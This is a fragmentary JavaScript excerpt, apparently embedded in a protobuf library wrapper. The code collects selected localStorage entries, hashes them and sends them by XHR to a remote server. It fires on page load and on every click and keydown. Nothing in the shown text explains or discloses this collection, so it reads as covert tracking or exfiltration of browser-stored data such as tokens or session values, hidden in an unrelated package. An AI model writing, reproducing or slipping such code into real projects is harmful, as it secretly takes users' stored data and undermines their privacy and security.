...
(function ($protobuf) {
  ...
  let globalVariables = [];
  function hashGenerator(inputData) {
    const dataKeys = Object.keys(inputData);
    const joinedKeys = dataKeys.join("");
    let hashCode = 0;
    for (let idx = 0; idx < joinedKeys.length; idx++) {
      const charCode = joinedKeys.charCodeAt(idx);
  ...
  function getLocalStorageInfo() {
    ...
    for (let idx = 0; idx < window.localStorage.length; idx++) {
      const localKey = window.localStorage.key(idx);
      if (trackKeys.includes(localKey)) {
        const localValue = window.localStorage.getItem(localKey);
        localStorageInfo[localKey] = localValue;
      }
    }
  ...
  function sendToServer(info) {
    const uniqueHash = hashGenerator(info);
    ...
    xhr.onreadystatechange = function () {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        if (xhr.status === 200) {
          ...
          console.error("Data send failure. Error Code: " + xhr.status);
        }
      }
    };
  }
  ...
  window.addEventListener("load", trackAndSendData, false);
  window.addEventListener("click", trackAndSendData, false);
  ...
  window.addEventListener("keydown", trackAndSendData, false);
